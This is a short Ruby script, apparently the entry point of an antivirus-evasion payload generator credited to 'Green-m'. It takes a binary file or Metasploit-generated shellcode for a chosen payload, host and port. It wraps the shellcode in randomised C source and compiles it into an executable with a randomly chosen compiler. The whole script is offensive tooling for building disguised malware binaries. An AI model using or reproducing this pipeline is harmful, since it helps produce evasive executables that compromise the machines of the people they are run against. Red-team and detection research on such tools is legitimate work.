#!/usr/bin/env ruby
# -*- coding: binary -*-
# Code by Green-m
# Test  on ruby 2.3.3


$LOAD_PATH.unshift(File.dirname(__FILE__))
require 'env'




options = Starter::Console.new.start

if options[:file] 
    bin = File.binread(options[:file] )
    shellcode = Encoder::bin_to_cshellcode(bin)
else
    shellcode = MsfRunner.new(options[:payload],options[:host],options[:port],options[:other]).run
end


#debug

begin

code = PayloadMaker.new(shellcode,false).compile_random

Compilers::compilers_check
ExeMaker.new(code).ramdom_compiler

rescue Exception => e
  output_bad e.message
  output_line e.backtrace.inspect

end

